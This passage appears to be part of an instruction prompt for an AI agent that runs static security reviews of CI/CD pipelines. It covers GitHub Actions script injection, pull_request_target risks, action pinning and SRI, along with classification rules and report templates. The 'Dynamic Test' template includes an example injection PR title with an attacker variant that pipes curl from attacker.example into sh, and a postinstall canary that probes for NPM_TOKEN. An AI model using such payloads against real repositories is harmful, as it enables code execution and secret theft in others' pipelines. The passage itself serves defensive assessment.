> - Cloud OIDC (`id-token: write` + `aws-actions/configure-aws-credentials`, `azure/login`, `google-github-actions/auth`), deploy keys, registry/publish tokens, signing keys, `persist-credentials` (default true leaves the token in `.git/config`), self-hosted runner access to internal networks.
>
> **(d) For mutable references, missing SRI, and unverified downloads**:
> - Is the upstream mutable (tag, branch, `latest`, unversioned CDN path, URL without checksum)? Who controls it — GitHub-owned, a verified vendor, or an individual maintainer? Does the step run with secrets, write permissions, or OIDC, or does it produce release/deploy artifacts, published packages, or container images? Does the SRI-less asset load on authenticated pages handling sensitive data?
>
> **(e) Mitigations to check**:
> - `env:` indirection with a quoted `"$VAR"` reference (effective for `run:` injection; NOT for writes to `GITHUB_ENV`/`GITHUB_OUTPUT`, `eval`, `sh -c`, or `ssh` command strings)
> - Environment protection rules / required reviewers on the environment that holds the secrets; fork guards such as `if: github.event.pull_request.head.repo.full_name == github.repository`; `author_association` checks (note `CONTRIBUTOR` means anyone with a merged commit)
> - Label-gated `pull_request_target` (`safe-to-test`): only effective if the checkout uses the SHA reviewed at label time — otherwise the attacker pushes new commits after labeling (TOCTOU)
> - `persist-credentials: false`; split design — unprivileged `pull_request` workflow produces data, privileged `workflow_run` validates it strictly and never executes it
> - Full-SHA pinning, SRI with exact versions, checksum/signature verification, lockfile-enforcing installs
>
> **Vulnerable vs. Secure examples for this project's CI platform**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: An external or low-privilege actor can inject or execute code in a job that has secrets or write permissions (e.g., script injection on `issues` / `issue_comment` / `pull_request_target`, PR-head checkout + build in `pull_request_target`, artifact executed in `workflow_run`), or an unsigned update/plugin path lets a network or upstream attacker execute code in the application.
> - **Likely Vulnerable**: Injection exists but the trigger is limited to collaborators, or secrets exposure depends on repo settings not visible in code. Unpinned third-party actions, missing SRI, and `curl | sh` / downloads without checksum are typically **Likely Vulnerable** (supply-chain exposure, Medium) — raise to Vulnerable only when they run in a release/deploy job with secrets and the upstream is an individually maintained mutable reference with a concrete takeover path.
> - **Not Vulnerable**: The untrusted value is not attacker-controlled, or it is properly passed via `env:` and quoted, or the trigger/runner exposes no secrets and no write permissions, or the reference is immutable/verified.
> - **Needs Manual Review**: Exploitability depends on repo/org settings (fork PR approval policy, default `GITHUB_TOKEN` permissions, environment protection rules, GitLab Protected variable flags, Jenkins fork trust, repository visibility) — state exactly which setting to check.
>
> **Output format** — write to `sast/cicd-batch-[N].md`:
>
> ```markdown
> # CI/CD Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Workflow / job / step**: [workflow name → job id → step]
> - **Category**: [category from recon]
> - **Issue**: [e.g., "`github.event.issue.title` interpolated into `run:` on `issues: opened`"]
> - **Attack path**: [trigger → controlled input → execution point → secrets/permissions reached, e.g., "Any user opens an issue → title → bash in `triage` job → `GITHUB_TOKEN` with `contents: write` + `secrets.NPM_TOKEN`"]
> - **Impact**: [e.g., push malicious commits/tags, publish a backdoored package, steal cloud credentials via OIDC, poison release artifacts]
> - **Remediation**: [Concrete YAML/Dockerfile/HTML patch showing the fixed lines — env indirection, trigger change, SHA pin, `permissions:` block, checksum, SRI attribute]
> - **Dynamic Test**:
>   ```
>   [Only test against your own fork or a disposable test repository — never against a project you do not own.
>    Examples:
>      Script injection: open a PR from a fork titled  a"; echo "INJECTED-$((6*7))"; echo "
>        and look for INJECTED-42 in the job log (attacker variant: a"; curl -sSfL https://attacker.example/x | sh; echo ")
>      PPE: in a fork PR add "postinstall": "echo INJECTED; echo token-present:${NPM_TOKEN:+yes}" to package.json
>      SRI: curl -sSfL "<src URL>" | openssl dgst -sha384 -binary | openssl base64 -A   (compare with integrity=)
>      Pinning: gh api repos/<owner>/<repo>/commits/<tag> --jq .sha   (shows the tag is a movable pointer; use the SHA to pin)]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Workflow / job / step**: [workflow name → job id → step]
> - **Category**: [category from recon]
> - **Issue**: [e.g., "Third-party action pinned to mutable tag in release job"]
> - **Attack path**: [Best-effort path; mark the assumption or setting it depends on]
> - **Concern**: [Why it remains a risk; state Medium for supply-chain exposure unless context raises it]
> - **Remediation**: [Concrete patch]
> - **Dynamic Test**:
>   ```
>   [verification step — e.g., checksum comparison, gh api lookup, canary payload in a test fork]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Workflow / job / step**: [workflow name → job id → step]
> - **Reason**: [e.g., "Value passed via env: and quoted" or "`pull_request` trigger on GitHub-hosted runner, no secrets"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Workflow / job / step**: [workflow name → job id → step]
> - **Uncertainty**: [Why exploitability could not be determined from code]
> - **Suggestion**: [Exact setting to check — e.g., "Settings → Actions → General → Workflow permissions (read vs. read/write)", "Fork pull request workflows approval policy", "Environment `production` required reviewers", "GitLab variable `PROD_DEPLOY_KEY` Protected flag"; or `gh api repos/<owner>/<repo>/actions/permissions/workflow`]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `sast/cicd-batch-*.md` file and merge them into a single `sast/cicd-results.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `sast/cicd-batch-1.md`, `sast/cicd-batch-2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary (candidates analyzed = total candidates from recon that were batched, i.e., sum of candidates across batches).
4. Write the merged report to `sast/cicd-results.md` using this format:

```markdown
# CI/CD & Integrity Analysis Results: [Project Name]

## Executive Summary
- Candidates analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `sast/cicd-results.md`, **delete all intermediate batch files** (`sast/cicd-batch-*.md`).

---

## Important Reminders

- Read `sast/architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 candidates per subagent**. If there are 1-3 candidates total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned candidates' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: inventory pipeline files and flag every matching pattern, regardless of who can trigger the pipeline. Do not assess reachability in Phase 1.
- **Phase 2 is purely reachability analysis**: who can trigger it, who controls the value, and what secrets/permissions are in scope when it runs.
- **Quoting does not stop `${{ }}` injection**: `run: echo "${{ github.event.issue.title }}"` is vulnerable because GitHub substitutes the expression into the script text before the shell parses the quotes. Only `env:` indirection fixes it.
- **`actions/github-script` `script:` with `${{ }}` is JavaScript injection**, not just shell injection — a backtick or quote in the value breaks out of the string literal and runs Node.js code with the `github-token`.
- **Composite actions propagate injection**: `${{ inputs.x }}` in an `action.yml` `run:` step is vulnerable whenever any caller passes attacker-controlled data. Report it at the action and name the tainted caller(s).
- **Fork `pull_request` runs get no secrets by default, but `pull_request_target`, `workflow_run`, and `issue_comment` do** — they run in the base repository context even when the content comes from a fork.
- **GitHub-owned actions pinned by tag are lower risk** than third-party actions; still list them, but classify third-party mutable references in privileged jobs first.
- **One finding per distinct injection point**: the same expression used in three steps is three findings; the same unpinned action used in ten workflows may be reported once with all locations listed.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable", and name the exact repository or organization setting that decides exploitability. False negatives are worse than false positives in security assessment.
- Clean up intermediate files: delete all `sast/cicd-batch-*.md` files after the final `sast/cicd-results.md` is written. **Preserve** `sast/cicd-recon.md` — the orchestrator reuses it on later runs.
